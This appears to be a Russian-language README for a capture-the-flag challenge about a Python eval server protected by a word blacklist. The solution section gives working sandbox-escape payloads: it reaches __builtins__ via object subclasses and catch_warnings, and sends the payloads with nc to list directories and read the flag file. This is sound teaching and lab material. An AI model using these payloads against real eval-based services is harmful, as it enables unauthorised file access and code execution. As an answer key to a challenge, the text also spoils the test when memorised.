Python eval
===========
**eval**
> К сожалению, кто-то сумел расшифровать тайное послание от Боба, из-за чего он лишился работы и, как мы подозреваем, стал работать на тайную организацию, целью которой является захват мира.  
> У Боба есть одна небольшая слабость — любовь к Python'у. Говорят, он даже написал свой сервер (ссылка на исходник), чтобы удаленно писать код.  
> Говорят, на его компьютере лежат планы захвата мира. Заполучите их!  

Файлы
-----
1. **eval.py** - Псевдо исходный код, который доступен участникам
2. **159fe327e79316e0f9169fa326fafbd1.txt** - Файл с флагом
3. **blacklist.txt** - Файл с запрещенными словами
4. **server.py** - Исходный код

Запуск
------
```
python3 server.py [-h] [-host HOST] [-p PORT] [-cpu CPU] [-t TIMEOUT]
```
host - Имя хоста, по умолчанию - socket.gethostname()  
port - Порт, по умолчанию 1337  
cpu - Количество одновременно запущенных процессов, по умолчанию 16  
timeout - Время жизни одного процесса, по умолчанию 3 секунды  

Решение
-------
1. Научиться получать доступ к \__builtins__  
    ```
    [x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__
    ```
2. Получить список файлов в папке  
    ```
    echo "[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').listdir()" | nc адрес порт
    ```
3. Прочесть флаг  
    ```
    echo "[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['open']('имя файла с флагом').read()" | nc адрес порт
    ```

---

[Описание проблемы](https://habrahabr.ru/post/221937/)  
[Источник](https://www.reddit.com/r/Python/comments/hftnp/ask_rpython_recovering_cleared_globals#thing_t1_c1v372r)  
[Еще полезная ссылочка](http://www.floyd.ch/?p=584)
